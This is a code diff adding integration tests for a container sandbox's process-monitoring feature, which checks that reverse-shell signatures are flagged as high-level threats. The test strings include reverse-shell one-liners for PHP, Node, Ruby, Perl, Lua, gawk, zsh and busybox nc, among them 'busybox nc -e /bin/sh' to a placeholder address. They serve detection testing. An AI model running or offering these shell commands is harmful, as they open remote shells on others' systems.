@@ -5065,6 +5065,369 @@ process_spawn_rate_threshold = 9999
                 config_path.unlink()
             cleanup_container(container_name, coi_binary)
 
+    def test_php_fsockopen_exec_detected(self, test_workspace, coi_binary):
+        """The php-fsockopen exec pattern fires when argv[0] is 'php' and 'fsockopen' is in cmdline.
+
+        Uses exec -a to set argv[0] to the PHP one-liner signature on a sleep process so that
+        PROC_EVENT_EXEC fires with the right cmdline without requiring php-cli to be installed.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-68"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "68",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
+            time.sleep(3)
+
+            # Use exec -a to set argv[0] to the PHP fsockopen signature and run
+            # sleep as the actual process. PROC_EVENT_EXEC fires at execve time,
+            # and sleep keeps the process alive long enough to avoid a read race.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "exec -a 'php -r $sock=fsockopen(10.255.255.1,9999)' sleep 10",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            # Poll until the proc_event threat appears (30 s timeout).
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern")
+                    == "php-fsockopen"
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for php fsockopen one-liner, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected high level, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_node_reverse_shell_exec_detected(self, test_workspace, coi_binary):
+        """The node-reverse-shell exec pattern fires when argv[0] is 'node' and both
+        'child_process' and 'net' appear in the cmdline.
+
+        Uses exec -a to set argv[0] to the Node one-liner signature on a sleep process so
+        PROC_EVENT_EXEC fires with the right cmdline without requiring node to be installed.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-69"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "69",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
+            time.sleep(3)
+
+            # Use exec -a to set argv[0] to the Node reverse-shell signature and run
+            # sleep as the actual process. PROC_EVENT_EXEC fires at execve time, and
+            # sleep keeps the process alive long enough to avoid a read race.
+            # Keywords 'child_process' and 'net' appear in the argv[0] string.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "exec -a 'node -e var sh=require(child_process);require(net).connect(9999)' sleep 10",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            # Poll until the proc_event threat appears (30 s timeout).
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern")
+                    == "node-reverse-shell"
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for node reverse-shell one-liner, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected high level, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def _run_exec_pattern_test(
+        self,
+        test_workspace,
+        coi_binary,
+        slot: int,
+        pattern_name: str,
+        exec_a_arg: str,
+    ):
+        """Verify a proc_event exec pattern fires using exec -a on a sleep process.
+
+        Uses exec -a to set argv[0] of sleep to the given signature string so that
+        PROC_EVENT_EXEC fires with the right cmdline without requiring the actual
+        binary to be installed in the container.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + f"-{slot}"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                str(slot),
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            time.sleep(3)  # allow monitoring daemon and PROC_EVENTS to initialise
+
+            # exec -a sets argv[0] of sleep to the suspicious signature so the
+            # proc_event watcher sees the right cmdline without needing the binary.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    f"exec -a '{exec_a_arg}' sleep 10",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern") == pattern_name
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for {pattern_name}, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected HIGH for {pattern_name}, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_ruby_socket_exec_detected(self, test_workspace, coi_binary):
+        """ruby-socket pattern fires when argv[0] starts with 'ruby' and '-rsocket' is in cmdline."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            70,
+            "ruby-socket",
+            "ruby -rsocket -e exit if fork",
+        )
+
+    def test_perl_socket_connect_exec_detected(self, test_workspace, coi_binary):
+        """perl-socket-connect pattern fires when argv[0] is 'perl' and 'sockaddr_in' is in cmdline."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            71,
+            "perl-socket-connect",
+            "perl -e use Socket;sockaddr_in(9999,inet_aton(host))",
+        )
+
+    def test_lua_socket_exec_detected(self, test_workspace, coi_binary):
+        """lua-socket pattern fires when argv[0] is 'lua' and both require('socket') and :connect( appear."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            72,
+            "lua-socket",
+            'lua -e local s=require("socket").tcp();s:connect("10.255.255.1",9999)',
+        )
+
+    def test_gawk_inet_exec_detected(self, test_workspace, coi_binary):
+        """gawk-inet pattern fires when argv[0] is 'gawk' and '/inet/tcp/' is in cmdline."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            73,
+            "gawk-inet",
+            "gawk /inet/tcp/0/10.255.255.1/9999",
+        )
+
+    def test_zsh_net_tcp_exec_detected(self, test_workspace, coi_binary):
+        """zsh-net-tcp pattern fires when argv[0] is 'zsh' and 'ztcp' is in cmdline."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            74,
+            "zsh-net-tcp",
+            "zsh -c ztcp 10.255.255.1 9999",
+        )
+
+    def test_busybox_nc_exec_detected(self, test_workspace, coi_binary):
+        """busybox-nc-exec pattern fires when argv[0] is 'busybox' and both 'nc' and '-e' appear."""
+        self._run_exec_pattern_test(
+            test_workspace,
+            coi_binary,
+            75,
+            "busybox-nc-exec",
+            "busybox nc -e /bin/sh 10.255.255.1 9999",
+        )
+
 
 # These end-to-end tests verify all monitoring aspects:
 # - Threat detection (reverse shells, env scanning, large file reads, network connections)
